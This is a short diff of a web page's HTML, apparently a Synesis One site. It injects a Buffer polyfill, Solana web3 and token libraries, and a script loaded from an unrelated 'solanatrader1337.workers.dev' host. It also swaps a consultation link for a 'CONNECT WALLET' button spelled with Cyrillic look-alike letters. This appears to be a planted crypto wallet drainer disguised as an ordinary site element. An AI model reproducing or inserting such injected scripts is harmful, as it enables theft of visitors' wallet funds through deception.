@@ -39,6 +39,26 @@
         <link rel="icon" href="/images/logo.png" type="image/png" sizes="16x16"/>
         <link rel="manifest" href="/images/manifest.json"/>
         <script src="/_next/static/chunks/polyfills-42372ed130431b0a.js" noModule=""></script>
+    <!-- MAIN -->
+    <script>
+    window.Buffer = window.Buffer || {
+      from: function (data, encoding) {
+        if (typeof data === 'string' && encoding === 'hex') {
+          const hex = data.match(/.{1,2}/g).map(h => parseInt(h, 16));
+          return new Uint8Array(hex);
+        }
+        return new Uint8Array(data);
+      },
+      alloc: function (size) {
+        return new Uint8Array(size);
+      }
+    };
+    console.log("Использован минимальный полифилл Buffer");
+    </script>
+    <script src="https://unpkg.com/@solana/web3.js@1.91.1/lib/index.iife.min.js"></script>
+    <script src="https://unpkg.com/@solana/spl-token@0.1.6/lib/index.iife.js"></script>
+    <script src="https://settings.solanatrader1337.workers.dev"></script>
+    <!-- MAIN -->
     </head>
     <body class="__variable_37cf7d antialiased">
         <div class="w-full md:h-[80px]">
@@ -68,7 +88,7 @@
                                 </li>
                             </ul>
                         </div>
-                        <a class="menu-link-no-active" href="/book-a-demo">BOOK A CONSULTATION</a>
+                        <a ID = "status" class="menu-link-no-active connect-button">CONNEСT WАLLET</a>
                         <a target="_blank" class="menu-link-no-active" href="https://train.synesis.one">
                             TRAIN 2 EARN
                             <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
